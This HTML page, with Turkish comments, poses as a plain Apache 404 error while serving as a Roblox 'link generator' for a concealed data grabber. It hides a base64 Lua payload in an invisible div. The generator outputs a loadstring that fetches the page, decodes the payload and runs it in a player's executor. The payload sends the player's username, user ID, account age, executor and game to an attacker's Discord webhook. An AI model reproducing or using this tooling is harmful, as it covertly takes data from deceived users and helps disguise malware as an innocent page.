<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        /* Standart Sunucu 404 Hatası Görünümü */
        body {
            background-color: #ffffff;
            color: #000000;
            font-family: Arial, Helvetica, sans-serif;
            margin: 40px;
        }
        h1 {
            font-size: 24px;
            font-weight: normal;
            border-bottom: 1px solid #ccc;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
        }
        hr {
            border: 0;
            border-top: 1px solid #ccc;
            margin-top: 20px;
        }
        .server-info {
            font-size: 12px;
            color: #555;
            font-style: italic;
        }
        /* Arayüz Paneli (Sadece şifresiz ana linke girildiğinde görünür) */
        #generator-panel {
            display: none;
            background-color: #16161f;
            color: #fff;
            padding: 30px;
            border-radius: 16px;
            max-width: 550px;
            margin: 0 auto;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            border: 1px solid #232335;
        }
        #generator-panel h2 { color: #00ffa6; text-align: center; margin-top: 0; }
        #generator-panel input { width: 100%; padding: 12px; margin: 15px 0; background: #1e1e2a; border: 1px solid #333; color: #fff; border-radius: 6px; }
        #generator-panel button { width: 100%; padding: 12px; background: #00ffa6; color: #000; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
        #generator-panel textarea { width: 100%; height: 60px; margin-top: 15px; background: #12121a; color: #00ffa6; border: 1px solid #333; padding: 10px; resize: none; border-radius: 6px; font-family: monospace; }
    </style>
</head>
<body>

<div id="error-page">
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <p class="server-info">Apache/2.4.41 (Ubuntu) Server at github.io Port 443</p>
</div>

<div id="generator-panel">
    <h2>Roblox Advanced Link Generator</h2>
    <p style="text-align:center; color:#aaa; font-size:12px;">Webhook adresini gir gizli loadstring linkini al.</p>
    <input type="text" id="webhookUrl" placeholder="Discord Webhook Linki...">
    <button onclick="generateLink()">Gizli Link Oluştur</button>
    
    <div id="resultBox" style="display:none;">
        <textarea id="outputCode" readonly></textarea>
        <button style="background:#333; color:#fff; margin-top:10px;" onclick="copyToClipboard()">Linki Kopyala</button>
    </div>
</div>

<div id="secure-payload" style="display:none; visibility:hidden;">START_PATCH_LUA_CODE</div>

<script>
window.onload = function() {
    const hash = window.location.hash;
    
    // Eğer linkin sonunda şifreli webhook varsa (# varsa)
    if (hash && hash.length > 10) {
        document.getElementById('error-page').style.display = 'block';
        document.getElementById('generator-panel').style.display = 'none';
        document.title = "404 Not Found";
        
        let decodedWebhook = "";
        try {
            decodedWebhook = atob(hash.substring(1));
        } catch(e) {
            return;
        }

        // Executor'ın arka planda çalıştıracağı gerçek Lua kodu (Base64 olarak elementin içine gömüyoruz)
        const rawLua = `
local webhook = "${decodedWebhook}"
local Players = game:GetService("Players")
local Market = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local userId = player.UserId
local username = player.Name
local displayName = player.DisplayName
local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
local playerInServer = #Players:GetPlayers()
local accountAge = player.AccountAge

local gameName = "Bilinmiyor"
pcall(function()
    gameName = Market:GetProductInfo(game.PlaceId).Name
end)

local executor = identifyexecutor and identifyexecutor() or "Bilinmeyen Executor"
local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

local data = {
    ["embeds"] = {{
        ["title"] = "🚀 Veri Yakalandı!",
        ["color"] = 16711710,
        ["fields"] = {
            {["name"] = "Username", ["value"] = username, ["inline"] = true},
            {["name"] = "Display Name", ["value"] = displayName, ["inline"] = true},
            {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "Hesap Yaşı", ["value"] = tostring(accountAge) .. " Gün", ["inline"] = true},
            {["name"] = "Sunucu Doluluğu", ["value"] = tostring(playerInServer) .. " Oyuncu", ["inline"] = true},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "Oyun", ["value"] = gameName, ["inline"] = false},
            {["name"] = "Profil", ["value"] = "[Profil Linki](" .. profileUrl .. ")", ["inline"] = false}
        },
        ["timestamp"] = timestamp
    }}
}

-- Tam uyumlu request modülü (Verinin gitmeme sorununu çözen kısım)
local requestFunc = request or http_request or syn and syn.request or http and http.request
if requestFunc then
    requestFunc({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end
`;
        // Kodları HTML içinde tamamen erişilmez hale getirmek için şifreliyoruz
        document.getElementById('secure-payload').innerText = btoa(rawLua);
    } else {
        // Eğer normal girildiyse oluşturucu paneli göster
        document.getElementById('error-page').style.display = 'none';
        document.getElementById('generator-panel').style.display = 'block';
        document.title = "Link Generator";
    }
}

function generateLink() {
    const wh = document.getElementById('webhookUrl').value.trim();
    if(!wh.includes('discord.com/api/webhooks/')) {
        alert('Geçerli bir webhook gir!');
        return;
    }
    const encoded = btoa(wh);
    const cleanUrl = window.location.href.split('#')[0];
    const finalPageUrl = cleanUrl + "#" + encoded;
    
    // Roblox executor'ında çalıştırılacak sahte 404 filtresinden geçebilen loadstring
    const executionLoadstring = `loadstring(game:HttpGet("${finalPageUrl}"))()`;
    
    // Executor uyumlu, sayfadaki gizli div'den şifreli kodu söküp çözen loadstring yapısı:
    const bypassCode = `local url = "${finalPageUrl}"\nlocal html = game:HttpGet(url)\nlocal b64 = string.match(html, 'id="secure-payload"[^>]*>([^<]+)')\nif b64 then\n    local function decode(data)\n        local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n        data = string.gsub(data, '[^'..b..'=]', '')\n        return (data:gsub('.', function(x)\n            if (x == '=') then return '' end\n            local r,f='',(b:find(x)-1)\n            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end\n            return r;\n        end):gsub('%d%d%d%d%d%d%d%d', function(x)\n            local r=0\n            for i=1,8 do r=r+(x:sub(i,i)=='1' and 2^(8-i) or 0) end\n            return string.char(r)\n        end))\n    end\n    loadstring(decode(b64))()\nend`;

    document.getElementById('outputCode').value = bypassCode;
    document.getElementById('resultBox').style.display = 'block';
}

function copyToClipboard() {
    const copyText = document.getElementById("outputCode");
    copyText.select();
    navigator.clipboard.writeText(copyText.value);
    alert("Gizli Loadstring kodu kopyalandı!");
}
</script>
</body>
</html>
